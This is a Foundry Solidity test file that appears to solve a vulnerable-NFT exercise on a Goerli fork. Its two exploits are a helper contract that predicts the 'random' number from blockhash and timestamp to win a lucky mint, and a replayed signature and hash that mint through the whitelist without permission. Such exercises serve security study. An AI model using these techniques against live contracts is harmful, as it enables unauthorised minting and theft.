// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.19;

import "../src/VulnerableNFT/VNFT.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract VNFTTest is Test {
    address alice;
    address contractAddress = 0xC357c220D9ffe0c23282fCc300627f14D9B6314C;

    function setUp() public {
        string memory RPC = vm.envString("GOERLI_RPC_URL");
        vm.createSelectFork(RPC, 7439186);
        alice = makeAddr("alice");
    }

    function testImFeelingLucky() public {
        VNFT vnft = VNFT(payable(contractAddress));
        vm.startPrank(alice);
        assertEq(vnft.balanceOf(alice), 0);
        new Lucky(vnft);
        assertEq(vnft.balanceOf(alice), 1);
        vm.stopPrank();
    }

    function testwWitelistMint() public {
        //use input of https://goerli.etherscan.io/tx/0x77b3f89a955bd272221d7acb84600b6f9a1cdab47bdc6d3bb13fd6bc0877b6bf

        VNFT vnft = VNFT(payable(contractAddress));
        vm.startPrank(alice);
        // function whitelistMint(
        //     address to,
        //     uint256 qty,
        //     bytes32 hash,
        //     bytes memory signature
        // )

        bytes32 _hash = bytes32(0xd54b100c13f0d0e7860323e08f5eeb1eac1eeeae8bf637506280f00acd457f54);
        bytes memory _sig =
            hex"f80b662a501d9843c0459883582f6bb8015785da6e589643c2e53691e7fd060c24f14ad798bfb8882e5109e2756b8443963af0848951cffbd1a0ba54a2034a951c";

        vnft.whitelistMint(alice, 1, _hash, _sig);
        assertEq(vnft.balanceOf(alice), 1);
    }
}

contract Lucky {
    constructor(VNFT vnft) {
        uint256 randomNumber =
            uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp, vnft.totalSupply()))) % 100;

        vnft.imFeelingLucky(msg.sender, 1, randomNumber);
    }
}
